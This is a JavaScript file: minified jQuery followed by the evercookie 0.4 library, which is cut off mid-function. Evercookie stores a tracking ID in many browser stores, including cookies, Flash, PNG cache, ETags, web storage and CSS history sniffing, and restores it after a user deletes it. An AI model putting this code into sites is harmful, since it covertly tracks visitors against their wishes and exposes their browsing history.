this.each(function(b){n(this).removeClass(a.call(this,b,this.className))});if(j)for(b=(a||"").match(F)||[];i>h;h++)if(c=this[h],d=1===c.nodeType&&(c.className?(" "+c.className+" ").replace(vc," "):"")){f=0;while(e=b[f++])while(d.indexOf(" "+e+" ")>=0)d=d.replace(" "+e+" "," ");g=a?n.trim(d):"",c.className!==g&&(c.className=g)}return this},toggleClass:function(a,b){var c=typeof a;return"boolean"==typeof b&&"string"===c?b?this.addClass(a):this.removeClass(a):this.each(n.isFunction(a)?function(c){n(this).toggleClass(a.call(this,c,this.className,b),b)}:function(){if("string"===c){var b,d=0,e=n(this),f=a.match(F)||[];while(b=f[d++])e.hasClass(b)?e.removeClass(b):e.addClass(b)}else(c===L||"boolean"===c)&&(this.className&&n._data(this,"__className__",this.className),this.className=this.className||a===!1?"":n._data(this,"__className__")||"")})},hasClass:function(a){for(var b=" "+a+" ",c=0,d=this.length;d>c;c++)if(1===this[c].nodeType&&(" "+this[c].className+" ").replace(vc," ").indexOf(b)>=0)return!0;return!1}}),n.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),function(a,b){n.fn[b]=function(a,c){return arguments.length>0?this.on(b,null,a,c):this.trigger(b)}}),n.fn.extend({hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)},bind:function(a,b,c){return this.on(a,null,b,c)},unbind:function(a,b){return this.off(a,null,b)},delegate:function(a,b,c,d){return this.on(b,a,c,d)},undelegate:function(a,b,c){return 1===arguments.length?this.off(a,"**"):this.off(b,a||"**",c)}});var wc=n.now(),xc=/\?/,yc=/(,)|(\[|{)|(}|])|"(?:[^"\\\r\n]|\\["\\\/bfnrt]|\\u[\da-fA-F]{4})*"\s*:?|true|false|null|-?(?!0\d)\d+(?:\.\d+|)(?:[eE][+-]?\d+|)/g;n.parseJSON=function(b){if(a.JSON&&a.JSON.parse)return a.JSON.parse(b+"");var c,d=null,e=n.trim(b+"");return e&&!n.trim(e.replace(yc,function(a,b,e,f){return c&&b&&(d=0),0===d?a:(c=e||b,d+=!f-!e,"")}))?Function("return "+e)():n.error("Invalid JSON: "+b)},n.parseXML=function(b){var c,d;if(!b||"string"!=typeof b)return null;try{a.DOMParser?(d=new DOMParser,c=d.parseFromString(b,"text/xml")):(c=new ActiveXObject("Microsoft.XMLDOM"),c.async="false",c.loadXML(b))}catch(e){c=void 0}return c&&c.documentElement&&!c.getElementsByTagName("parsererror").length||n.error("Invalid XML: "+b),c};var zc,Ac,Bc=/#.*$/,Cc=/([?&])_=[^&]*/,Dc=/^(.*?):[ \t]*([^\r\n]*)\r?$/gm,Ec=/^(?:about|app|app-storage|.+-extension|file|res|widget):$/,Fc=/^(?:GET|HEAD)$/,Gc=/^\/\//,Hc=/^([\w.+-]+:)(?:\/\/(?:[^\/?#]*@|)([^\/?#:]*)(?::(\d+)|)|)/,Ic={},Jc={},Kc="*/".concat("*");try{Ac=location.href}catch(Lc){Ac=z.createElement("a"),Ac.href="",Ac=Ac.href}zc=Hc.exec(Ac.toLowerCase())||[];function Mc(a){return function(b,c){"string"!=typeof b&&(c=b,b="*");var d,e=0,f=b.toLowerCase().match(F)||[];if(n.isFunction(c))while(d=f[e++])"+"===d.charAt(0)?(d=d.slice(1)||"*",(a[d]=a[d]||[]).unshift(c)):(a[d]=a[d]||[]).push(c)}}function Nc(a,b,c,d){var e={},f=a===Jc;function g(h){var i;return e[h]=!0,n.each(a[h]||[],function(a,h){var j=h(b,c,d);return"string"!=typeof j||f||e[j]?f?!(i=j):void 0:(b.dataTypes.unshift(j),g(j),!1)}),i}return g(b.dataTypes[0])||!e["*"]&&g("*")}function Oc(a,b){var c,d,e=n.ajaxSettings.flatOptions||{};for(d in b)void 0!==b[d]&&((e[d]?a:c||(c={}))[d]=b[d]);return c&&n.extend(!0,a,c),a}function Pc(a,b,c){var d,e,f,g,h=a.contents,i=a.dataTypes;while("*"===i[0])i.shift(),void 0===e&&(e=a.mimeType||b.getResponseHeader("Content-Type"));if(e)for(g in h)if(h[g]&&h[g].test(e)){i.unshift(g);break}if(i[0]in c)f=i[0];else{for(g in c){if(!i[0]||a.converters[g+" "+i[0]]){f=g;break}d||(d=g)}f=f||d}return f?(f!==i[0]&&i.unshift(f),c[f]):void 0}function Qc(a,b,c,d){var e,f,g,h,i,j={},k=a.dataTypes.slice();if(k[1])for(g in a.converters)j[g.toLowerCase()]=a.converters[g];f=k.shift();while(f)if(a.responseFields[f]&&(c[a.responseFields[f]]=b),!i&&d&&a.dataFilter&&(b=a.dataFilter(b,a.dataType)),i=f,f=k.shift())if("*"===f)f=i;else if("*"!==i&&i!==f){if(g=j[i+" "+f]||j["* "+f],!g)for(e in j)if(h=e.split(" "),h[1]===f&&(g=j[i+" "+h[0]]||j["* "+h[0]])){g===!0?g=j[e]:j[e]!==!0&&(f=h[0],k.unshift(h[1]));break}if(g!==!0)if(g&&a["throws"])b=g(b);else try{b=g(b)}catch(l){return{state:"parsererror",error:g?l:"No conversion from "+i+" to "+f}}}return{state:"success",data:b}}n.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:Ac,type:"GET",isLocal:Ec.test(zc[1]),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":Kc,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":n.parseJSON,"text xml":n.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(a,b){return b?Oc(Oc(a,n.ajaxSettings),b):Oc(n.ajaxSettings,a)},ajaxPrefilter:Mc(Ic),ajaxTransport:Mc(Jc),ajax:function(a,b){"object"==typeof a&&(b=a,a=void 0),b=b||{};var c,d,e,f,g,h,i,j,k=n.ajaxSetup({},b),l=k.context||k,m=k.context&&(l.nodeType||l.jquery)?n(l):n.event,o=n.Deferred(),p=n.Callbacks("once memory"),q=k.statusCode||{},r={},s={},t=0,u="canceled",v={readyState:0,getResponseHeader:function(a){var b;if(2===t){if(!j){j={};while(b=Dc.exec(f))j[b[1].toLowerCase()]=b[2]}b=j[a.toLowerCase()]}return null==b?null:b},getAllResponseHeaders:function(){return 2===t?f:null},setRequestHeader:function(a,b){var c=a.toLowerCase();return t||(a=s[c]=s[c]||a,r[a]=b),this},overrideMimeType:function(a){return t||(k.mimeType=a),this},statusCode:function(a){var b;if(a)if(2>t)for(b in a)q[b]=[q[b],a[b]];else v.always(a[v.status]);return this},abort:function(a){var b=a||u;return i&&i.abort(b),x(0,b),this}};if(o.promise(v).complete=p.add,v.success=v.done,v.error=v.fail,k.url=((a||k.url||Ac)+"").replace(Bc,"").replace(Gc,zc[1]+"//"),k.type=b.method||b.type||k.method||k.type,k.dataTypes=n.trim(k.dataType||"*").toLowerCase().match(F)||[""],null==k.crossDomain&&(c=Hc.exec(k.url.toLowerCase()),k.crossDomain=!(!c||c[1]===zc[1]&&c[2]===zc[2]&&(c[3]||("http:"===c[1]?"80":"443"))===(zc[3]||("http:"===zc[1]?"80":"443")))),k.data&&k.processData&&"string"!=typeof k.data&&(k.data=n.param(k.data,k.traditional)),Nc(Ic,k,b,v),2===t)return v;h=k.global,h&&0===n.active++&&n.event.trigger("ajaxStart"),k.type=k.type.toUpperCase(),k.hasContent=!Fc.test(k.type),e=k.url,k.hasContent||(k.data&&(e=k.url+=(xc.test(e)?"&":"?")+k.data,delete k.data),k.cache===!1&&(k.url=Cc.test(e)?e.replace(Cc,"$1_="+wc++):e+(xc.test(e)?"&":"?")+"_="+wc++)),k.ifModified&&(n.lastModified[e]&&v.setRequestHeader("If-Modified-Since",n.lastModified[e]),n.etag[e]&&v.setRequestHeader("If-None-Match",n.etag[e])),(k.data&&k.hasContent&&k.contentType!==!1||b.contentType)&&v.setRequestHeader("Content-Type",k.contentType),v.setRequestHeader("Accept",k.dataTypes[0]&&k.accepts[k.dataTypes[0]]?k.accepts[k.dataTypes[0]]+("*"!==k.dataTypes[0]?", "+Kc+"; q=0.01":""):k.accepts["*"]);for(d in k.headers)v.setRequestHeader(d,k.headers[d]);if(k.beforeSend&&(k.beforeSend.call(l,v,k)===!1||2===t))return v.abort();u="abort";for(d in{success:1,error:1,complete:1})v[d](k[d]);if(i=Nc(Jc,k,b,v)){v.readyState=1,h&&m.trigger("ajaxSend",[v,k]),k.async&&k.timeout>0&&(g=setTimeout(function(){v.abort("timeout")},k.timeout));try{t=1,i.send(r,x)}catch(w){if(!(2>t))throw w;x(-1,w)}}else x(-1,"No Transport");function x(a,b,c,d){var j,r,s,u,w,x=b;2!==t&&(t=2,g&&clearTimeout(g),i=void 0,f=d||"",v.readyState=a>0?4:0,j=a>=200&&300>a||304===a,c&&(u=Pc(k,v,c)),u=Qc(k,u,v,j),j?(k.ifModified&&(w=v.getResponseHeader("Last-Modified"),w&&(n.lastModified[e]=w),w=v.getResponseHeader("etag"),w&&(n.etag[e]=w)),204===a||"HEAD"===k.type?x="nocontent":304===a?x="notmodified":(x=u.state,r=u.data,s=u.error,j=!s)):(s=x,(a||!x)&&(x="error",0>a&&(a=0))),v.status=a,v.statusText=(b||x)+"",j?o.resolveWith(l,[r,x,v]):o.rejectWith(l,[v,x,s]),v.statusCode(q),q=void 0,h&&m.trigger(j?"ajaxSuccess":"ajaxError",[v,k,j?r:s]),p.fireWith(l,[v,x]),h&&(m.trigger("ajaxComplete",[v,k]),--n.active||n.event.trigger("ajaxStop")))}return v},getJSON:function(a,b,c){return n.get(a,b,c,"json")},getScript:function(a,b){return n.get(a,void 0,b,"script")}}),n.each(["get","post"],function(a,b){n[b]=function(a,c,d,e){return n.isFunction(c)&&(e=e||d,d=c,c=void 0),n.ajax({url:a,type:b,dataType:e,data:c,success:d})}}),n.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(a,b){n.fn[b]=function(a){return this.on(b,a)}}),n._evalUrl=function(a){return n.ajax({url:a,type:"GET",dataType:"script",async:!1,global:!1,"throws":!0})},n.fn.extend({wrapAll:function(a){if(n.isFunction(a))return this.each(function(b){n(this).wrapAll(a.call(this,b))});if(this[0]){var b=n(a,this[0].ownerDocument).eq(0).clone(!0);this[0].parentNode&&b.insertBefore(this[0]),b.map(function(){var a=this;while(a.firstChild&&1===a.firstChild.nodeType)a=a.firstChild;return a}).append(this)}return this},wrapInner:function(a){return this.each(n.isFunction(a)?function(b){n(this).wrapInner(a.call(this,b))}:function(){var b=n(this),c=b.contents();c.length?c.wrapAll(a):b.append(a)})},wrap:function(a){var b=n.isFunction(a);return this.each(function(c){n(this).wrapAll(b?a.call(this,c):a)})},unwrap:function(){return this.parent().each(function(){n.nodeName(this,"body")||n(this).replaceWith(this.childNodes)}).end()}}),n.expr.filters.hidden=function(a){return a.offsetWidth<=0&&a.offsetHeight<=0||!l.reliableHiddenOffsets()&&"none"===(a.style&&a.style.display||n.css(a,"display"))},n.expr.filters.visible=function(a){return!n.expr.filters.hidden(a)};var Rc=/%20/g,Sc=/\[\]$/,Tc=/\r?\n/g,Uc=/^(?:submit|button|image|reset|file)$/i,Vc=/^(?:input|select|textarea|keygen)/i;function Wc(a,b,c,d){var e;if(n.isArray(b))n.each(b,function(b,e){c||Sc.test(a)?d(a,e):Wc(a+"["+("object"==typeof e?b:"")+"]",e,c,d)});else if(c||"object"!==n.type(b))d(a,b);else for(e in b)Wc(a+"["+e+"]",b[e],c,d)}n.param=function(a,b){var c,d=[],e=function(a,b){b=n.isFunction(b)?b():null==b?"":b,d[d.length]=encodeURIComponent(a)+"="+encodeURIComponent(b)};if(void 0===b&&(b=n.ajaxSettings&&n.ajaxSettings.traditional),n.isArray(a)||a.jquery&&!n.isPlainObject(a))n.each(a,function(){e(this.name,this.value)});else for(c in a)Wc(c,a[c],b,e);return d.join("&").replace(Rc,"+")},n.fn.extend({serialize:function(){return n.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var a=n.prop(this,"elements");return a?n.makeArray(a):this}).filter(function(){var a=this.type;return this.name&&!n(this).is(":disabled")&&Vc.test(this.nodeName)&&!Uc.test(a)&&(this.checked||!X.test(a))}).map(function(a,b){var c=n(this).val();return null==c?null:n.isArray(c)?n.map(c,function(a){return{name:b.name,value:a.replace(Tc,"\r\n")}}):{name:b.name,value:c.replace(Tc,"\r\n")}}).get()}}),n.ajaxSettings.xhr=void 0!==a.ActiveXObject?function(){return!this.isLocal&&/^(get|post|head|put|delete|options)$/i.test(this.type)&&$c()||_c()}:$c;var Xc=0,Yc={},Zc=n.ajaxSettings.xhr();a.ActiveXObject&&n(a).on("unload",function(){for(var a in Yc)Yc[a](void 0,!0)}),l.cors=!!Zc&&"withCredentials"in Zc,Zc=l.ajax=!!Zc,Zc&&n.ajaxTransport(function(a){if(!a.crossDomain||l.cors){var b;return{send:function(c,d){var e,f=a.xhr(),g=++Xc;if(f.open(a.type,a.url,a.async,a.username,a.password),a.xhrFields)for(e in a.xhrFields)f[e]=a.xhrFields[e];a.mimeType&&f.overrideMimeType&&f.overrideMimeType(a.mimeType),a.crossDomain||c["X-Requested-With"]||(c["X-Requested-With"]="XMLHttpRequest");for(e in c)void 0!==c[e]&&f.setRequestHeader(e,c[e]+"");f.send(a.hasContent&&a.data||null),b=function(c,e){var h,i,j;if(b&&(e||4===f.readyState))if(delete Yc[g],b=void 0,f.onreadystatechange=n.noop,e)4!==f.readyState&&f.abort();else{j={},h=f.status,"string"==typeof f.responseText&&(j.text=f.responseText);try{i=f.statusText}catch(k){i=""}h||!a.isLocal||a.crossDomain?1223===h&&(h=204):h=j.text?200:404}j&&d(h,i,j,f.getAllResponseHeaders())},a.async?4===f.readyState?setTimeout(b):f.onreadystatechange=Yc[g]=b:b()},abort:function(){b&&b(void 0,!0)}}}});function $c(){try{return new a.XMLHttpRequest}catch(b){}}function _c(){try{return new a.ActiveXObject("Microsoft.XMLHTTP")}catch(b){}}n.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/(?:java|ecma)script/},converters:{"text script":function(a){return n.globalEval(a),a}}}),n.ajaxPrefilter("script",function(a){void 0===a.cache&&(a.cache=!1),a.crossDomain&&(a.type="GET",a.global=!1)}),n.ajaxTransport("script",function(a){if(a.crossDomain){var b,c=z.head||n("head")[0]||z.documentElement;return{send:function(d,e){b=z.createElement("script"),b.async=!0,a.scriptCharset&&(b.charset=a.scriptCharset),b.src=a.url,b.onload=b.onreadystatechange=function(a,c){(c||!b.readyState||/loaded|complete/.test(b.readyState))&&(b.onload=b.onreadystatechange=null,b.parentNode&&b.parentNode.removeChild(b),b=null,c||e(200,"success"))},c.insertBefore(b,c.firstChild)},abort:function(){b&&b.onload(void 0,!0)}}}});var ad=[],bd=/(=)\?(?=&|$)|\?\?/;n.ajaxSetup({jsonp:"callback",jsonpCallback:function(){var a=ad.pop()||n.expando+"_"+wc++;return this[a]=!0,a}}),n.ajaxPrefilter("json jsonp",function(b,c,d){var e,f,g,h=b.jsonp!==!1&&(bd.test(b.url)?"url":"string"==typeof b.data&&!(b.contentType||"").indexOf("application/x-www-form-urlencoded")&&bd.test(b.data)&&"data");return h||"jsonp"===b.dataTypes[0]?(e=b.jsonpCallback=n.isFunction(b.jsonpCallback)?b.jsonpCallback():b.jsonpCallback,h?b[h]=b[h].replace(bd,"$1"+e):b.jsonp!==!1&&(b.url+=(xc.test(b.url)?"&":"?")+b.jsonp+"="+e),b.converters["script json"]=function(){return g||n.error(e+" was not called"),g[0]},b.dataTypes[0]="json",f=a[e],a[e]=function(){g=arguments},d.always(function(){a[e]=f,b[e]&&(b.jsonpCallback=c.jsonpCallback,ad.push(e)),g&&n.isFunction(f)&&f(g[0]),g=f=void 0}),"script"):void 0}),n.parseHTML=function(a,b,c){if(!a||"string"!=typeof a)return null;"boolean"==typeof b&&(c=b,b=!1),b=b||z;var d=v.exec(a),e=!c&&[];return d?[b.createElement(d[1])]:(d=n.buildFragment([a],b,e),e&&e.length&&n(e).remove(),n.merge([],d.childNodes))};var cd=n.fn.load;n.fn.load=function(a,b,c){if("string"!=typeof a&&cd)return cd.apply(this,arguments);var d,e,f,g=this,h=a.indexOf(" ");return h>=0&&(d=a.slice(h,a.length),a=a.slice(0,h)),n.isFunction(b)?(c=b,b=void 0):b&&"object"==typeof b&&(f="POST"),g.length>0&&n.ajax({url:a,type:f,dataType:"html",data:b}).done(function(a){e=arguments,g.html(d?n("<div>").append(n.parseHTML(a)).find(d):a)}).complete(c&&function(a,b){g.each(c,e||[a.responseText,b,a])}),this},n.expr.filters.animated=function(a){return n.grep(n.timers,function(b){return a===b.elem}).length};var dd=a.document.documentElement;function ed(a){return n.isWindow(a)?a:9===a.nodeType?a.defaultView||a.parentWindow:!1}n.offset={setOffset:function(a,b,c){var d,e,f,g,h,i,j,k=n.css(a,"position"),l=n(a),m={};"static"===k&&(a.style.position="relative"),h=l.offset(),f=n.css(a,"top"),i=n.css(a,"left"),j=("absolute"===k||"fixed"===k)&&n.inArray("auto",[f,i])>-1,j?(d=l.position(),g=d.top,e=d.left):(g=parseFloat(f)||0,e=parseFloat(i)||0),n.isFunction(b)&&(b=b.call(a,c,h)),null!=b.top&&(m.top=b.top-h.top+g),null!=b.left&&(m.left=b.left-h.left+e),"using"in b?b.using.call(a,m):l.css(m)}},n.fn.extend({offset:function(a){if(arguments.length)return void 0===a?this:this.each(function(b){n.offset.setOffset(this,a,b)});var b,c,d={top:0,left:0},e=this[0],f=e&&e.ownerDocument;if(f)return b=f.documentElement,n.contains(b,e)?(typeof e.getBoundingClientRect!==L&&(d=e.getBoundingClientRect()),c=ed(f),{top:d.top+(c.pageYOffset||b.scrollTop)-(b.clientTop||0),left:d.left+(c.pageXOffset||b.scrollLeft)-(b.clientLeft||0)}):d},position:function(){if(this[0]){var a,b,c={top:0,left:0},d=this[0];return"fixed"===n.css(d,"position")?b=d.getBoundingClientRect():(a=this.offsetParent(),b=this.offset(),n.nodeName(a[0],"html")||(c=a.offset()),c.top+=n.css(a[0],"borderTopWidth",!0),c.left+=n.css(a[0],"borderLeftWidth",!0)),{top:b.top-c.top-n.css(d,"marginTop",!0),left:b.left-c.left-n.css(d,"marginLeft",!0)}}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||dd;while(a&&!n.nodeName(a,"html")&&"static"===n.css(a,"position"))a=a.offsetParent;return a||dd})}}),n.each({scrollLeft:"pageXOffset",scrollTop:"pageYOffset"},function(a,b){var c=/Y/.test(b);n.fn[a]=function(d){return W(this,function(a,d,e){var f=ed(a);return void 0===e?f?b in f?f[b]:f.document.documentElement[d]:a[d]:void(f?f.scrollTo(c?n(f).scrollLeft():e,c?e:n(f).scrollTop()):a[d]=e)},a,d,arguments.length,null)}}),n.each(["top","left"],function(a,b){n.cssHooks[b]=Mb(l.pixelPosition,function(a,c){return c?(c=Kb(a,b),Ib.test(c)?n(a).position()[b]+"px":c):void 0})}),n.each({Height:"height",Width:"width"},function(a,b){n.each({padding:"inner"+a,content:b,"":"outer"+a},function(c,d){n.fn[d]=function(d,e){var f=arguments.length&&(c||"boolean"!=typeof d),g=c||(d===!0||e===!0?"margin":"border");return W(this,function(b,c,d){var e;return n.isWindow(b)?b.document.documentElement["client"+a]:9===b.nodeType?(e=b.documentElement,Math.max(b.body["scroll"+a],e["scroll"+a],b.body["offset"+a],e["offset"+a],e["client"+a])):void 0===d?n.css(b,c,g):n.style(b,c,d,g)},b,f?d:void 0,f,null)}})}),n.fn.size=function(){return this.length},n.fn.andSelf=n.fn.addBack,"function"==typeof define&&define.amd&&define("jquery",[],function(){return n});var fd=a.jQuery,gd=a.$;return n.noConflict=function(b){return a.$===n&&(a.$=gd),b&&a.jQuery===n&&(a.jQuery=fd),n},typeof b===L&&(a.jQuery=a.$=n),n});



/*
 * evercookie 0.4 (10/13/2010) -- extremely persistent cookies
 *
 *  by samy kamkar : code@samy.pl : http://samy.pl
 *
 * this api attempts to produce several types of persistent data
 * to essentially make a cookie virtually irrevocable from a system
 *
 * specifically it uses:
 *  - standard http cookies
 *  - flash cookies (local shared objects)
 *  - silverlight isolated storage
 *  - png generation w/forced cache and html5 canvas pixel reading
 *  - http etags
 *  - http cache
 *  - window.name
 *  - IE userData
 *  - html5 session cookies
 *  - html5 local storage
 *  - html5 global storage
 *  - html5 database storage via sqlite
 *  - css history scanning
 *
 *  if any cookie is found, it's then reset to all the other locations
 *  for example, if someone deletes all but one type of cookie, once
 *  that cookie is re-discovered, all of the other cookie types get reset
 *
 *  !!! SOME OF THESE ARE CROSS-DOMAIN COOKIES, THIS MEANS
 *  OTHER SITES WILL BE ABLE TO READ SOME OF THESE COOKIES !!!
 *
 * USAGE:

	var ec = new evercookie();	
	
	// set a cookie "id" to "12345"
	// usage: ec.set(key, value)
	ec.set("id", "12345");
	
	// retrieve a cookie called "id" (simply)
	ec.get("id", function(value) { alert("Cookie value is " + value) });

	// or use a more advanced callback function for getting our cookie
    // the cookie value is the first param
    // an object containing the different storage methods
	// and returned cookie values is the second parameter
    function getCookie(best_candidate, all_candidates)
    {
        alert("The retrieved cookie is: " + best_candidate + "\n" +
        	"You can see what each storage mechanism returned " +
			"by looping through the all_candidates object.");

		for (var item in all_candidates)
			document.write("Storage mechanism " + item +
				" returned " + all_candidates[item] + " votes<br>");
    }
    ec.get("id", getCookie);

	// we look for "candidates" based off the number of "cookies" that
	// come back matching since it's possible for mismatching cookies.
	// the best candidate is very-very-likely the correct one
	
*/

/* to turn off CSS history knocking, set _ec_history to 0 */
var _ec_history = 1; // CSS history knocking or not .. can be network intensive
var _ec_tests = 10;//1000;
var _ec_debug = 0;

function _ec_dump(arr, level)
{
	var dumped_text = "";
	if(!level) level = 0;
	
	//The padding given at the beginning of the line.
	var level_padding = "";
	for(var j=0;j<level+1;j++) level_padding += "    ";
	
	if(typeof(arr) == 'object') { //Array/Hashes/Objects 
		for(var item in arr) {
			var value = arr[item];
			
			if(typeof(value) == 'object') { //If it is an array,
				dumped_text += level_padding + "'" + item + "' ...\n";
				dumped_text += _ec_dump(value,level+1);
			} else {
				dumped_text += level_padding + "'" + item + "' => \"" + value + "\"\n";
			}
		}
	} else { //Stings/Chars/Numbers etc.
		dumped_text = "===>"+arr+"<===("+typeof(arr)+")";
	}
	return dumped_text;
}

function _ec_replace(str, key, value)
{
	if (str.indexOf('&' + key + '=') > -1 || str.indexOf(key + '=') == 0)
	{
		// find start
		var idx = str.indexOf('&' + key + '=');
		if (idx == -1)
			idx = str.indexOf(key + '=');

		// find end
		var end = str.indexOf('&', idx + 1);
		var newstr;
		if (end != -1)
			newstr = str.substr(0, idx) + str.substr(end + (idx ? 0 : 1)) + '&' + key + '=' + value;
		else
			newstr = str.substr(0, idx) + '&' + key + '=' + value;

		return newstr;
	}
	else
		return str + '&' + key + '=' + value;
}


// necessary for flash to communicate with js...
// please implement a better way
var _global_lso;
function _evercookie_flash_var(cookie)
{
	_global_lso = cookie;

	// remove the flash object now
	var swf = $('#myswf');
	if (swf && swf.parentNode)
		swf.parentNode.removeChild(swf);
}

var evercookie = (function () {
this._class = function() {

var self = this;
// private property
_baseKeyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
this._ec = {};
var no_color = -1;

this.get = function(name, cb, dont_reset)
{
	$(document).ready(function() {
		self._evercookie(name, cb, undefined, undefined, dont_reset);
	});
}

this.set = function(name, value)
{
	$(document).ready(function() {
			self._evercookie(name, function() { }, value);
	});
}

this._evercookie = function(name, cb, value, i, dont_reset)
{
	if (typeof self._evercookie == 'undefined')
		self = this;
	
	if (typeof i == 'undefined')
		i = 0;

	// first run
	if (i == 0)
	{
		self.evercookie_database_storage(name, value);
		self.evercookie_png(name, value);
		self.evercookie_etag(name, value);
		self.evercookie_cache(name, value);
		self.evercookie_lso(name, value);
		self.evercookie_silverlight(name, value);

		self._ec.userData		= self.evercookie_userdata(name, value);
		self._ec.cookieData		= self.evercookie_cookie(name, value);
		self._ec.localData		= self.evercookie_local_storage(name, value);
		self._ec.globalData		= self.evercookie_global_storage(name, value);
		self._ec.sessionData	= self.evercookie_session_storage(name, value);
		self._ec.windowData		= self.evercookie_window(name, value);
	
		if (_ec_history)
			self._ec.historyData = self.evercookie_history(name, value);
	}

	// when writing data, we need to make sure lso and silverlight object is there
	if (typeof value != 'undefined')
	{
		if (
            (
                (typeof _global_lso == 'undefined') ||
                (typeof _global_isolated == 'undefined')
            )
            && i++ < _ec_tests
        )
			setTimeout(function() { self._evercookie(name, cb, value, i, dont_reset) }, 300);
	}
	
	// when reading data, we need to wait for swf, db, silverlight and png
	else
	{
		if (
			(
				// we support local db and haven't read data in yet
				(window.openDatabase && typeof self._ec.dbData == 'undefined') ||
				(typeof _global_lso == 'undefined') ||
				(typeof self._ec.etagData == 'undefined') ||
				(typeof self._ec.cacheData == 'undefined') ||
				(document.createElement('canvas').getContext && (typeof self._ec.pngData == 'undefined' || self._ec.pngData == '')) ||
                (typeof _global_isolated == 'undefined')
			)
			&&
			i++ < _ec_tests
		)
		{
			setTimeout(function() { self._evercookie(name, cb, value, i, dont_reset) }, 300);
		}

		// we hit our max wait time or got all our data
		else
		{
			// get just the piece of data we need from swf
			self._ec.lsoData = self.getFromStr(name, _global_lso);
			_global_lso = undefined;
            
			// get just the piece of data we need from silverlight
			self._ec.slData = self.getFromStr(name, _global_isolated);
			_global_isolated = undefined;

			var tmpec = self._ec;
			self._ec = {};
			
			// figure out which is the best candidate
			var candidates = new Array();
			var bestnum = 0;
			var candidate;
			for (var item in tmpec)
			{
				if (typeof tmpec[item] != 'undefined' && typeof tmpec[item] != 'null' && tmpec[item] != '' &&
				  tmpec[item] != 'null' && tmpec[item] != 'undefined' && tmpec[item] != null)
				{
						candidates[tmpec[item]] = typeof candidates[tmpec[item]] == 'undefined' ? 1 : candidates[tmpec[item]] + 1;
				}
			}
			
			for (var item in candidates)
			{
				if (candidates[item] > bestnum)
				{
					bestnum = candidates[item];
					candidate = item;
				}
			}
			
			// reset cookie everywhere
			if (typeof dont_reset == "undefined" || dont_reset != 1)
				self.set(name, candidate);

			if (typeof cb == 'function')
				cb(candidate, tmpec);
		}
	}
}

this.evercookie_window = function(name, value)
{
	try {
		if (typeof(value) != "undefined")
			window.name = _ec_replace(window.name, name, value);
		else
			return this.getFromStr(name, window.name);
	} catch(e) { }
}

this.evercookie_userdata = function(name, value)
{
	try {
		var elm = this.createElem('div', 'userdata_el', 1);
		elm.style.behavior = "url(#default#userData)";

		if (typeof(value) != "undefined")
		{
			elm.setAttribute(name, value);
			elm.save(name);
		}
		else
		{
			elm.load(name);
			return elm.getAttribute(name);
		}
	} catch(e) { }
}

this.evercookie_cache = function(name, value)
{
	if (typeof(value) != "undefined")
	{
		// make sure we have evercookie session defined first
		document.cookie = 'evercookie_cache=' + value;
		
		// evercookie_cache.php handles caching
		var img = new Image();
		img.style.visibility = 'hidden';
		img.style.position = 'absolute';
		img.src = 'evercookie_cache.php?name=' + name;
	}
	else
	{
		// interestingly enough, we want to erase our evercookie
		// http cookie so the php will force a cached response
		var origvalue = this.getFromStr('evercookie_cache', document.cookie);
		self._ec.cacheData = undefined;
		document.cookie = 'evercookie_cache=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';

		$.ajax({
			url: 'evercookie_cache.php?name=' + name,
			success: function(data) {
				// put our cookie back
				document.cookie = 'evercookie_cache=' + origvalue + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';

				self._ec.cacheData = data;
			}
		});
	}
}

this.evercookie_etag = function(name, value)
{
	if (typeof(value) != "undefined")
	{
		// make sure we have evercookie session defined first
		document.cookie = 'evercookie_etag=' + value;
		
		// evercookie_etag.php handles etagging
		var img = new Image();
		img.style.visibility = 'hidden';
		img.style.position = 'absolute';
		img.src = 'evercookie_etag.php?name=' + name;
	}
	else
	{
		// interestingly enough, we want to erase our evercookie
		// http cookie so the php will force a cached response
		var origvalue = this.getFromStr('evercookie_etag', document.cookie);
		self._ec.etagData = undefined;
		document.cookie = 'evercookie_etag=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';

		$.ajax({
			url: 'evercookie_etag.php?name=' + name,
			success: function(data) {
				// put our cookie back
				document.cookie = 'evercookie_etag=' + origvalue + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';

				self._ec.etagData = data;
			}
		});
	}
}

this.evercookie_lso = function(name, value)
{
    var div = document.getElementById('swfcontainer');
	if (!div)
	{
		div = document.createElement("div");
		div.setAttribute('id', 'swfcontainer');
		document.body.appendChild(div);
	}

	var flashvars = {};
	if (typeof value != 'undefined')
		flashvars.everdata = name + '=' + value;

	var params           = {};
	params.swliveconnect = "true";
	var attributes       = {};
	attributes.id        = "myswf";
	attributes.name      = "myswf";
	swfobject.embedSWF("evercookie.swf", "swfcontainer", "1", "1", "9.0.0", false, flashvars, params, attributes);
}

this.evercookie_png = function(name, value)
{
	if (document.createElement('canvas').getContext)
	{
		if (typeof(value) != "undefined")
		{
			// make sure we have evercookie session defined first
			document.cookie = 'evercookie_png=' + value;
			
			// evercookie_png.php handles the hard part of generating the image
			// based off of the http cookie and returning it cached
			var img = new Image();
			img.style.visibility = 'hidden';
			img.style.position = 'absolute';
			img.src = 'evercookie_png.php?name=' + name;
		}
		else
		{
			self._ec.pngData = undefined;
			var context = document.createElement('canvas');
			context.style.visibility = 'hidden';
			context.style.position = 'absolute';
			context.width = 200;
			context.height = 1;
			var ctx = context.getContext('2d');
			
			// interestingly enough, we want to erase our evercookie
